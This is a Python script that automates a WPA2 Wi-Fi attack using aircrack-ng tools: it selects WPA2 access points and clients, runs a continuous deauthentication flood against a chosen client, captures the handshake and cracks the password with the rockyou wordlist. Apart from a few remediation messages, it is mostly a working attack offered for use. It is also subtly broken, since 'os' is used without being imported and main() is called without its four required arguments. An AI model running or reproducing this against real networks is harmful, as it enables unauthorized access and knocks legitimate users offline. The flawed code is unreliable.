import subprocess, signal, sys, time, shutil, csv

deauth_process = None  # Global variable to keep track of the deauth subprocess

def dump(ap_mac, channel):
    global deauth_process
    try:
        print("Starting packet capture on AP with BSSID:", ap_mac)
        # Initiate packet capture
        subprocess.run(["sudo", "airodump-ng", "wlan0mon", "--bssid", ap_mac, "-c", str(channel), "-w", "/mnt/data/wpa_attack"])
    except Exception as e:
        print("Failed to start dump:", e)
    finally:
        if deauth_process:
            deauth_process.terminate()  # Terminate deauth process when dump is done or fails

def deauth(ap_mac, c_mac, interface):
    try:
        print("Starting deauthentication attack on client with MAC:", c_mac)
        # Start the deauth process in the background
        global deauth_process
        deauth_process = subprocess.Popen(["sudo", "aireplay-ng", "-0", "0", "-a", ap_mac, "-c", c_mac, interface])
    except Exception as e:
        print("Failed to start deauth:", e)

def crack():
    try:
        print("Attempting to crack WPA password...")
        subprocess.run(["sudo", "aircrack-ng", "/mnt/data/wpa_attack-01.cap", "-w", "/usr/share/wordlists/rockyou.txt"])
    except Exception as e:
        print("Failed to start crack:", e)

def signal_handler(sig, frame):
    global deauth_process
    if deauth_process:
        deauth_process.terminate()  # Ensure deauth process is terminated on Ctrl+C
    print('Operation canceled by user.')
    sys.exit(0)

def move_cap_file():
    try:
        shutil.move("./wpa_attack-01.cap", "/mnt/data/wpa_attack-01.cap")
        print(".cap file moved to /mnt/data/")
    except Exception as e:
        print("Failed to move .cap file:", e)

def identify_wpa2():
    file_path = "/mnt/data/access_points.txt"
    try:
        with open(file_path, mode='r') as file:
            csv_reader = csv.reader(file)
            vulnerable_aps = []
            for row in csv_reader:
                if "WPA2" in row[1]:  # Assuming the encryption standard is in the second column
                    vulnerable_aps.append(row)
            if vulnerable_aps:
                print("Vulnerable Access Points Found:")
                for ap in vulnerable_aps:
                    print(f"SSID: {ap[2]}, BSSID: {ap[0]}, Encryption: {ap[1]}")
                    print("Note: Uses WPA2 encryption. While more secure than WEP, it's still less secure compared to WPA3.")
                    print("Remediation: Upgrade to WPA3 encryption for enhanced security.\n")
            else:
                print("No vulnerable access points found using WPA2 encryption.")
    except FileNotFoundError:
        print(f"The file {file_path} was not found.")
    except Exception as e:
        print(f"An error occurred while analyzing vulnerabilities: {e}")

def ensure_data_directory_exists():
    directory = "/mnt/data"
    if not os.path.exists(directory):
        os.makedirs(directory)
    return directory

def run_airodump(bssid):
    try:
        channel = "6"  # Assuming channel 6; adjust as necessary
        file_prefix = ensure_data_directory_exists() + "/airodump"
        command = [
            'airodump-ng',
            '-c', channel,
            '--bssid', bssid,
            'wlan0mon',
            '--write', file_prefix,
            '--output-format', 'csv'
        ]
        print("Running airodump-ng... Press Ctrl+C to stop.")
        
        # Running the process without redirecting stdout and stderr so output will be shown in the console
        airodump_process = subprocess.Popen(command)
        
        try:
            # Wait for the process to complete, or for a KeyboardInterrupt (Ctrl+C) to stop it
            airodump_process.wait()
        except KeyboardInterrupt:
            # Terminate the process if the user interrupts with Ctrl+C
            airodump_process.terminate()
            print("\nAirodump-ng stopped by user.")
        
        # After stopping, proceed to process the generated CSV files as before
        directory = ensure_data_directory_exists()
        csv_file = None
        for file in os.listdir(directory):
            if file.startswith("airodump") and file.endswith('.csv'):
                csv_file = directory + '/' + file
                break

        if csv_file is None:
            print("No CSV file generated by airodump-ng.")
            return

        clients = []
        with open(csv_file, mode='r') as file:
            content = file.read()
            client_section = content.split('Station MAC,')[1] if 'Station MAC,' in content else ''
            csv_reader = csv.reader(client_section.splitlines())
            next(csv_reader)  # Skip the header row
            for row in csv_reader:
                if len(row) > 0 and row[0].strip() != '':
                    clients.append(row[0].strip())

        if not clients:
            print("No clients found.")
            return

        clients_filename = directory + '/clients.txt'
        with open(clients_filename, 'w') as clients_file:
            for client in clients:
                clients_file.write(client + '\n')

        print("Clients found and saved to:", clients_filename)

        # Client selection
        print("Select a client by its index number:")
        for index, client in enumerate(clients):
            print(f"{index}: {client}")

        selected_index = int(input("Enter the index number of the target client: "))
        if 0 <= selected_index < len(clients):
            selected_client = clients[selected_index]
            print(f"Selected client MAC: {selected_client}")
            return selected_client
        else:
            print("Invalid index selected.")
            return None

    except Exception as e:
        print(f"An error occurred: {e}")
        return None

def target_ap():
    file_path = "/mnt/data/access_points.txt"
    try:
        with open(file_path, mode='r') as file:
            csv_reader = csv.reader(file)
            wpa2_aps = []
            for row in csv_reader:
                if "WPA2" in row[1]:  # Assuming the encryption standard is in the second column
                    wpa2_aps.append(row)

            if wpa2_aps:
                print("Select a Vulnerable Access Point by its index number:")
                for index, ap in enumerate(wpa2_aps):
                    print(f"{index}: SSID: {ap[2]}, BSSID: {ap[0]}, Encryption: {ap[1]}")
                
                # Assuming the selection process is outside of this function, as it would need user input.
                # User should replace `selected_index` with the actual selection mechanism, e.g., input from the user.
                selected_index = int(input("Enter the index number of the target AP: "))
                if 0 <= selected_index < len(wpa2_aps):
                    selected_ap = wpa2_aps[selected_index]
                    return selected_ap[2], selected_ap[0]  # Returning SSID and BSSID
                else:
                    print("Invalid index selected.")
                    return None, None
            else:
                print("No vulnerable access points found using WPA2 encryption.")
                return None, None

    except FileNotFoundError:
        print(f"The file {file_path} was not found.")
        return None, None
    except Exception as e:
        print(f"An error occurred: {e}")
        return None, None

def target_c(bssid):
    client_mac = run_airodump(bssid)
    return client_mac

def main(essid, ap_mac, your_mac, c_mac):
    channel = "6"  # Channel should be a string as it's passed directly to subprocess commands
    interface = "wlan0mon"
    
    signal.signal(signal.SIGINT, signal_handler)
    
    # Start deauth attack in the background
    deauth(ap_mac, c_mac, interface)
    
    print("Collecting packets, press Ctrl+C to stop...")
    try:
        dump(ap_mac, channel)
    except KeyboardInterrupt:
        move_cap_file()
        user_decision = input("\nDo you want to attempt to crack the WPA password? (y/n): ")
        if user_decision.lower() == 'y':
            print("Proceeding to crack the WPA password...")
            crack()
        else:
            print("Operation aborted by the user.")

if __name__ == "__main__":
    main()
